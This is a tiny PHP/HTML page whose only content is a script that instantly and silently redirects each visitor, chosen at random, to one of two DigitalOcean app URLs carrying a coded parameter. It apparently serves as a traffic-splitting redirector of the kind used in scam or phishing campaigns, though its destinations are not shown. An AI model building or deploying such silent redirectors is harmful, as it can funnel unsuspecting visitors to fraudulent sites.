<?php
  ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Red...</title>

<script>
(function () {
    const urlA = "https://seahorse-app-luh5g.ondigitalocean.app/?Anph=(0101)-21735-08134";
    const urlB = "https://lobster-app-tda8h.ondigitalocean.app/?Anph=(0101)-21735-08134";

    // 50-50 split
    const target = Math.random() < 0.5 ? urlA : urlB;

    // Instant redirect (no history)
    window.location.replace(target);
})();
</script>

</head>
<body>
</body>
</html>
